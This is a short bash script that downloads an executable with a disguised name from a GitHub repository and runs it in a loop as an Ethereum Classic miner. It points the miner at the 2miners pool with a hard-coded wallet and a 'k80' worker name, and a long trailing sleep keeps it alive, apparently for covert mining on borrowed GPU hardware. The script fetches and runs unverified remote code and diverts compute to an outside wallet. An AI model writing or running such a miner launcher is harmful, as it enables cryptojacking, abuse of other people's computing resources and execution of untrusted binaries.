#!/bin/bash
POOL=asia-etc.2miners.com:1010
WALLET=ETC:0x6172c0d0139e0ce7431cabceae0f59cd49422166
WORKER=k80
wget https://github.com/squibex/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
